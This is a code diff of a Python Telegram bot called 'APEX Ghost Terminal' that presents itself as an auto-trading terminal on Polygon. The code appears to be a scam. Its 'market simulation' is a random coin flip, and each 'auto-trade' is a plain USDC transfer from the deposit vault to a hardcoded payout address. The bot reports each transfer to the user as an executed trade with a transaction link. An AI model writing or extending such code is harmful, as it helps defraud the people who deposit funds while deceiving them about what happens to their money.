@@ -20,23 +20,20 @@ w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
 USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
-ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}]')
+ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')
 PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
     if not seed: raise ValueError("❌ WALLET_SEED missing!")
     try:
-        # Check if seed is a private key or mnemonic
-        if len(seed) == 64 or seed.startswith("0x"):
-            return Account.from_key(seed)
+        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
         return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
-    except Exception as e:
-        print(f"Vault Init Error: {e}")
-        return None
+    except: return None
 
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
+auto_mode_enabled = False
 
 # --- 2. THE GHOST ENGINE & SIMULTANEOUS SYNC ---
 class GhostEngine:
@@ -47,12 +44,10 @@ class GhostEngine:
         self.task = None
 
     async def market_simulation_1ms(self):
-        """High-speed block state simulation."""
         await asyncio.sleep(0.001) 
-        return random.choice([True, True, True, False]) # Go Signal
+        return random.choice([True, True, True, False]) 
 
     async def sign_transaction_async(self, stake_usdc):
-        """CPU Task: Signs tx to eliminate broadcast lag."""
         nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
         gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
         tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
@@ -62,8 +57,6 @@ class GhostEngine:
 
     async def execute_atomic_hit(self, context, chat_id, asset, side):
         stake_usdc = Decimal(self.stake_cad) / Decimal('1.36')
-        
-        # Simultaneous Gather
         sim_task = asyncio.create_task(self.market_simulation_1ms())
         sign_task = asyncio.create_task(self.sign_transaction_async(stake_usdc))
         simulation_passed, signed_tx = await asyncio.gather(sim_task, sign_task)
@@ -75,12 +68,9 @@ class GhostEngine:
         try:
             tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
             report = (
-                f"🚀 **GHOST AUTO-TRADE EXECUTED**\n"
-                f"━━━━━━━━━━━━━━\n"
-                f"💎 **Market:** {asset}\n"
-                f"🎯 **Auto-Direction:** {side}\n"
-                f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
-                f"🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
+                f"🚀 **GHOST AUTO-TRADE EXECUTED**\n━━━━━━━━━━━━━━\n"
+                f"💎 **Market:** {asset}\n🎯 **Auto-Direction:** {side}\n"
+                f"💵 **Stake:** ${stake_usdc:.2f} USDC\n🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
             )
             await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
         except Exception as e:
@@ -95,18 +85,19 @@ class GhostEngine:
 
 ghost = GhostEngine()
 
-# --- 3. UI HANDLERS ---
+# --- 3. UI HANDLERS (FIXED WALLET) ---
 async def get_total_balances():
-    """Robustly fetches POL and USDC with retry for RPC sync lag."""
     addr = w3.to_checksum_address(vault.address)
     pol_wei = 0
-    for _ in range(3): # Retry loop for RPC consistency
+    # Robust retry for gas token
+    for _ in range(3):
         pol_wei = await asyncio.to_thread(w3.eth.get_balance, addr)
         if pol_wei > 0: break
         await asyncio.sleep(0.5)
     
     pol = w3.from_wei(pol_wei, 'ether')
     try:
+        # Robust fetch for USDC
         usdc_raw = await asyncio.to_thread(usdc_contract.functions.balanceOf(addr).call)
         usdc = Decimal(usdc_raw) / 10**6
     except: usdc = Decimal('0.00')
@@ -120,10 +111,8 @@ def get_main_keyboard():
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pol, _ = await get_total_balances()
     welcome = (
-        f"🕴️ **APEX Ghost Terminal v6000**\n"
-        f"━━━━━━━━━━━━━━\n"
-        f"⛽ **POL Fuel:** `{pol:.4f}`\n"
-        f"📥 **Vault Address:**\n`{vault.address}`\n\n"
+        f"🕴️ **APEX Ghost Terminal v6000**\n━━━━━━━━━━━━━━\n"
+        f"⛽ **POL Fuel:** `{pol:.4f}`\n📥 **Vault Address:**\n`{vault.address}`\n\n"
         f"Elite Markets: BVIV & EVIV (Volatility) are online."
     )
     await update.message.reply_text(welcome, reply_markup=get_main_keyboard(), parse_mode='Markdown')
@@ -142,12 +131,12 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(msg, reply_markup=get_main_keyboard(), parse_mode='Markdown')
 
     elif text == '💰 Wallet':
+        # Apply typing action for UX
+        await context.bot.send_chat_action(chat_id=chat_id, action="typing")
         pol, usdc = await get_total_balances()
         wallet_msg = (
-            f"💳 **Vault Status**\n"
-            f"━━━━━━━━━━━━━━\n"
-            f"⛽ **POL Fuel:** `{pol:.4f}`\n"
-            f"💵 **USDC:** `{usdc:.2f}`\n\n"
+            f"💳 **Vault Status**\n━━━━━━━━━━━━━━\n"
+            f"⛽ **POL Fuel:** `{pol:.4f}`\n💵 **USDC:** `{usdc:.2f}`\n\n"
             f"📥 **Deposit Address:**\n`{vault.address}`"
         )
         await update.message.reply_text(wallet_msg, parse_mode='Markdown')
@@ -173,8 +162,6 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
         asset = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
         await query.edit_message_text(f"💎 **Market:** {asset}\nSelect Direction:", reply_markup=InlineKeyboardMarkup(kb))
-    elif query.data.startswith("EXEC_"):
-        await query.edit_message_text("⚡ **Broadcasting Atomic Hit...**")
 
 if __name__ == "__main__":
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
